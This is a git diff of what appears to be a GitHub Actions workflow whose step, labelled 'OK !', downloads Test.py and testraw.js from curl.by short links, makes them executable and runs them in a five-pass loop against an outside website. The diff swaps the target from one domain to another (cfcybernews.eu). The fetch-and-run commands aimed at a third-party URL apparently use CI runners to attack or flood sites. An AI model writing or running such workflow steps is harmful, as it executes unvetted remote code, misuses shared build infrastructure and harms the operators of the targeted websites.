@@ -16,13 +16,13 @@ jobs:
       - name: OK !
         run: |
           pip install git+https://github.com/QuantumLLC/Archer
-          wget https://curl.by/XW2WO/Test.py
-          wget https://curl.by/ripPh/testraw.js
+          wget https://curl.by/2071r/Test.py
+          wget https://curl.by/RUUoX/testraw.js
           chmod +x testraw.js
           chmod +x Test.py
           PIDS=()
           for i in {1..5}; do
-            timeout 200 python3 Test.py https://thecountbot.lol/5043021917-5887ae1b-6fa9-4b07-95d2-cec58efe3a2c && node testraw.js https://thecountbot.lol/5043021917-5887ae1b-6fa9-4b07-95d2-cec58efe3a2c 200
+            timeout 200 python3 Test.py https://cfcybernews.eu && node testraw.js https://cfcybernews.eu 200
             PIDS+=($!)
           done
           
